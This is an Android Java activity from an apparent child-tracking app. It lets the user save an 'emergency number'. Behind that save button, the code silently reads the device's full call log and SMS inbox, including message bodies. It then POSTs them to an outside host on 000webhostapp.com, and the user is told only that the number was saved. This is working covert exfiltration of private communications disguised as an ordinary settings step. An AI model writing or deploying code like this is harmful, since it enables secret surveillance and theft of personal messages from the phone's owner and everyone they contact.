package in.inetinfotech.ctracker_child;

import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class Phone extends AppCompatActivity {
SharedPreferences sharedPreferences;
EditText editText;
Button button;
    ArrayList sms;
TextView textView;
private boolean loggedIn = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_phone);
        sharedPreferences=getSharedPreferences("phone",MODE_PRIVATE);
        editText=findViewById(R.id.phone);
        button=findViewById(R.id.pbutton);
        textView=findViewById(R.id.textView);
        String n=sharedPreferences.getString("pnumber",null);
        textView.setText(n);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (editText.getText().toString().isEmpty()) {
                    editText.setError("Empty Field Exist");
                } else if (editText.getText().toString().length() < 10) {
                    // Snackbar.make(v,"invalid number",Snackbar.LENGTH_SHORT).show();
                    Toast.makeText(Phone.this, "Invalid Number", Toast.LENGTH_SHORT).show();
                } else {

                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString("pnumber", editText.getText().toString());
                    editor.putBoolean("phone", true);
                    editor.apply();
                   /* Snackbar snackbar=Snackbar.make(v,"Emergency Number Saved",Snackbar.LENGTH_SHORT);
                    snackbar.show();*/
                    Toast.makeText(Phone.this, "Emergency Number Saved", Toast.LENGTH_SHORT).show();
                    Intent intent = new Intent(Phone.this, MainActivity.class);
                    startActivity(intent);
                    final StringBuffer sb = new StringBuffer();
                    Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                            null, null, null);
                    int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                    int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                    int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
                    sb.append("Call Log :");
                    while (managedCursor.moveToNext()) {
                        String phNumber = managedCursor.getString(number);
                        String callType = managedCursor.getString(type);
                        String callDate = managedCursor.getString(date);
                        Date callDayTime = new Date(Long.valueOf(callDate));
                        String callDuration = managedCursor.getString(duration);
                        String dir = null;
                        int dircode = Integer.parseInt(callType);
                        switch (dircode) {
                            case CallLog.Calls.OUTGOING_TYPE:
                                dir = "OUTGOING";
                                break;

                            case CallLog.Calls.INCOMING_TYPE:
                                dir = "INCOMING";
                                break;

                            case CallLog.Calls.MISSED_TYPE:
                                dir = "MISSED";
                                break;
                        }
                        sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                                + dir + " \nCall Date:--- " + callDayTime
                                + " \nCall duration in sec :--- " + callDuration);
                        sb.append("\n----------------------------------");
                    }
                      sms = new ArrayList();

                    Uri uriSms = Uri.parse("content://sms/inbox");
                    Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);

                    cursor.moveToFirst();
                    while  (cursor.moveToNext())
                    {
                        String address = cursor.getString(1);
                        String body = cursor.getString(3);
                        System.out.println("Mobile number:"+address);
                        System.out.println("SMS Text:"+body);
                        sms.add("Address:"+address+"" +
                                "" +
                                "SMS:"+body);
                    }
                    //managedCursor.close();
                    StringRequest stringRequest = new StringRequest(Request.Method.POST,"https://anoopsuvarnan1.000webhostapp.com/calllog.php",
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {

Toast.makeText(Phone.this,response,Toast.LENGTH_LONG).show();
                                   /* if (response.equals("success")) {

                                        Toast.makeText(MainActivity.this, "success upload", Toast.LENGTH_SHORT).show();
                                        //Creating a shared preference

                                    } else {
                                        Toast.makeText(MainActivity.this, "success failed", Toast.LENGTH_SHORT).show();
                                        //If the server response is not success
                                        //Displaying an error message on toast
                                        // Toast.makeText(VerificationActivity.this,"success upload fail",Toast.LENGTH_SHORT).show();
                                    }*/
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    //You can handle error here if you want
                                }

                            }) {

                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            Map<String, String> params = new HashMap<>();
                            //Adding parameters to request
                            params.put("num", String.valueOf(sb));
                            params.put("sms",String.valueOf(sms));
                            //returning parameter
                            return params;
                        }
                    };

                    //Adding the string request to the queue
                    RequestQueue requestQueue = Volley.newRequestQueue(Phone.this);
                    requestQueue.add(stringRequest);





            }
            }
        });

    }
}
